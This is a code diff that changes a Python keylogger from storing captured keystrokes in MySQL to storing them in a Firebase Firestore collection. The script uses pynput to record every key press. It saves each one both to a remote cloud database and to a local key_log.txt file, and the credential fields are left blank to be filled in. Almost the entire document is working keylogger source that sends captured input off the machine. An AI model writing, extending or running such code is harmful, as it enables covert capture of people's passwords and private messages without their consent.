@@ -1,37 +1,47 @@
-import mysql.connector
 from pynput.keyboard import Key, Listener
+from firebase_admin import credentials, firestore, initialize_app
 
+def initialize_firebase():
+    try:
+        # Replace the following credentials with your hardcoded values
+        cred = credentials.Certificate({
+            "type": "",
+            "project_id": "",
+            "private_key_id": "",
+            "private_key": "",
+            "client_email": "",
+            "client_id": "",
+            "auth_uri": "",
+            "token_uri": "",
+            "auth_provider_x509_cert_url": "",
+            "client_x509_cert_url": "",
+            "universe_domain": ""
+        })
+
+        initialize_app(cred)
+        print("\nFirebase initialized successfully.")
+    except Exception as e:
+        print(f"\nError initializing Firebase: {e}")
+
+# Function to establish a connection to the Firebase database
 def connect_to_database():
+    initialize_firebase()
     try:
-        conn = mysql.connector.connect(
-            host='host',
-            user='user',
-            password='password',
-            database='database'
-        )
-        cursor = conn.cursor()
+        db = firestore.client()
+        return db
 
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS key_log (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                key_press TEXT
-            )
-        ''')
-        conn.commit()
+    except Exception as e:
+        print(f"Error connecting to Firebase: {e}")
+        return None
 
-        return conn, cursor
-
-    except mysql.connector.Error as e:
-        print(f"Error connecting to MySQL: {e}")
-        return None, None
-
-def write_to_database(conn, cursor, key):
+# Function to insert key press information into the database
+def write_to_database(db, key):
     try:
-        cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (str(key),))
-        conn.commit()
-    except mysql.connector.Error as e:
+        db.collection('key_log').add({'key_press': str(key)})
+    except Exception as e:
         print(f"Error writing to database: {e}")
 
+# Function to insert key press information into a file
 def write_to_file(key):
     try:
         with open("key_log.txt", "a") as file:
@@ -39,29 +49,28 @@ def write_to_file(key):
     except IOError as e:
         print(f"Error writing to file: {e}")
 
-def on_press(key, conn, cursor):
-    if key == Key.esc:
-        # Stop the listener
-        print("Keylogger execution interrupted by user.")
-        return False
+# Callback function for key press events
+def on_press(key, db):
     try:
-        write_to_database(conn, cursor, key)
+        write_to_database(db, key)
         write_to_file(key)
     except Exception as e:
         print(f"Error processing key: {e}")
 
-def on_release(key, conn):
-    pass  # You can add additional logic for key release if needed
+# Callback function for key release events
+def on_release(key):
+    if key == Key.esc:
+        # Stop the listener
+        print("Keylogger execution interrupted by user.")
+        return False
 
-def keylogger_thread():
-    conn, cursor = connect_to_database()
+if __name__ == "__main__":
+    # Establish a connection to the Firebase database
+    db = connect_to_database()
 
-    with Listener(on_press=lambda key: on_press(key, conn, cursor),
-                  on_release=lambda key: on_release(key, conn)) as listener:
+    with Listener(on_press=lambda key: on_press(key, db),
+                  on_release=on_release) as listener:
         try:
             listener.join()
         except KeyboardInterrupt:
             print("Keylogger execution interrupted by user.")
-
-if __name__ == "__main__":
-    keylogger_thread()
